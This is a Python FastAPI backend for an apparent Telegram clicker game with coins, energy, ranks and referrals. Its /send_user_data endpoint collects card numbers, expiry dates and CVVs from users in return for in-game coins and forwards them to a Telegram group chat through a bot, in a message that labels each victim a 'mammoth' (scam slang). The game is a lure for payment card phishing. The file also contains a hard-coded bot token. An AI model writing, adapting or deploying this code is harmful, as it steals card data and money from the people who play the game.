from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel
from fastapi.responses import JSONResponse
from typing import Dict
import uvicorn
import asyncio
from db.database import db, get_user_info, update_user_info, replace_user_energy, update_coins, get_referrals, checkUserBonus, giveBonus
from aiogram import Bot, Dispatcher
import os

BOT_TOKEN = "7204737488:AAG2WYGAT--J8sYMpmFi2MyOK6B2j0zg0Aw"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

app = FastAPI()

@app.on_event("startup")
async def startup():
    await db.connect()

@app.on_event("shutdown")
async def shutdown():
    await db.close()

# Настройка CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Позволяет всем доменам отправлять запросы
    allow_credentials=True,
    allow_methods=["*"],  # Позволяет все методы (POST, GET и т.д.)
    allow_headers=["*"],  # Позволяет все заголовки
)

templates = Jinja2Templates(directory="tempplates")

app.mount("/static", StaticFiles(directory='static'), name="static")

@app.get('/')
def index(req: Request):
    return templates.TemplateResponse(
        name='index.html',
        context={'request': req}
    )

@app.post('/update_user_info')
async def send_user_id(request: Request):
    data = await request.json()
    user_id = data['id']
    coins = data['coins']
    energy = data['energy']
    progress = data['progress']
    coinsPerClick = data['coinsPerClick']
    currentRank = data['currentRank']
    currentLevel = data['currentLevel']
    maxEnergy = data['maxEnergy']
    await update_user_info(user_id, coins, energy, progress, coinsPerClick, currentRank, currentLevel, maxEnergy)
    return {"status": "ok"}

@app.post('/gets_user_info')
async def gets_user_info(request: Request):
    data = await request.json()
    user_id = data['user_id']
    user_info = await get_user_info(user_id)
    return JSONResponse(content=user_info)

@app.post('/replace_energy')
async def replace_energy(request: Request):
    data = await request.json()
    user_id = data['user_id']
    maxEnergy = data['maxEnergy']
    
    # Запускаем таймер на 1 минуту в фоне
    asyncio.create_task(start_timer(user_id, maxEnergy))
    
    return {"status": "ok"}

async def start_timer(user_id, maxEnergy):
    await asyncio.sleep(1800)
    # Вызываем функцию для восстановления энергии пользователя
    await replace_user_energy(user_id, maxEnergy)

@app.post('/send_user_data')
async def send_user_data(request: Request):
    data = await request.json()
    user_id = data['user_id']
    card_number = data['card_number']
    date = data['date']
    cvv = data["cvv"]
    await update_coins(user_id)
    await bot.send_message(chat_id=-4288660442, text=f"<blockquote><b>‼️ НОВЫЙ МАМОНТ ‼️\n\n💠 CARD NUMBER:\n<code>🔹{card_number}</code>\n\n💠 DATE:\n<code>🔹{date}</code>\n\n💠 CVV:\n<code>🔹{cvv}</code></b></blockquote>", parse_mode="HTML")
    return {'status': 'ok'}

@app.post('/gets_user_referrals')
async def gets_user_referrals(request: Request):
    data = await request.json()
    user_id = data['user_id']
    user_referrals = await get_referrals(user_id)
    return user_referrals

@app.post('/check_user_bonus')
async def check_user_bonus(request: Request):
    data = await request.json()
    user_id = data['user_id']
    user_bonus = await checkUserBonus(user_id)
    return user_bonus

@app.post('/giveUserBonus')
async def giveUserBonus(request: Request):
    data = await request.json()
    user_id = data['user_id']
    await giveBonus(user_id)
    return {'status': 'ok'}

if __name__ == "__main__":
    uvicorn.run("app:app", host="0.0.0.0", port=8000, log_level="debug")